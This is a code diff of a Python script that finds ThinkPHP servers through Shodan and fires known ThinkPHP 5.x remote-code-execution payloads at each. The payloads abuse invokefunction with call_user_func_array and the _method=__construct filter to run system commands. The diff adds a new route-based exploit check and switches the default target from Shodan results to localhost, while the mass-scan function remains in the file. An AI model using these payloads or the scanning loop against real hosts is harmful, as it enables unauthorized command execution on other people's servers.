@@ -2,6 +2,7 @@ import re
 import requests
 from shodan import Shodan
 
+data_route = "/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=path"
 data_5010 = "s=set&filter%5B%5D=system&_method=__construct&method="
 data_5023 = "_method=__construct&filter[]=system&method=GET&get[]=set"
 data_5152 = "c=system&f=set&&_method=filter&"
@@ -13,6 +14,15 @@ headers = {
     'Accept-Encoding': 'gzip, deflate',
     'Content-Type': 'application/x-www-form-urlencoded', 
 }
+
+def check_route(url):
+    r = requests.get(url+data_route,headers=headers,timeout=1)
+    result = re.search(r"path=",r.text.replace(" ",""),re.I)
+    if result:
+        print(url,"route Vulnerable")
+    else:
+        print(url,"route Not Vulnerable")
+
 
 def check5010(url):
     
@@ -42,15 +52,13 @@ def check5152(url):
         print(url,"5152 Not Vulnerable")
     
 def apicheck():  
-    api = Shodan('your_api_key')
+    api = Shodan('key')
     try:
         # Search Shodan
         results = api.search('thinkphp')
-
         # Show the results
         print('Results found: {}'.format(results['total']))
         for result in results['matches']:
-                print('IP: {}'.format(result['ip_str']))
                 url = "http://" + result['ip_str']
                 try:
                     checkall(url)
@@ -63,8 +71,8 @@ def checkall(url):
     check5010(url)
     check5023(url)
     check5152(url)
+    check_route(url)
 
 if __name__ == "__main__":
-    apicheck()
-    #url = "http://127.0.0.1/tp511/public"
-    #checkall(url)
+    #apicheck()
+    checkall("http://127.0.0.1/tp511/public")
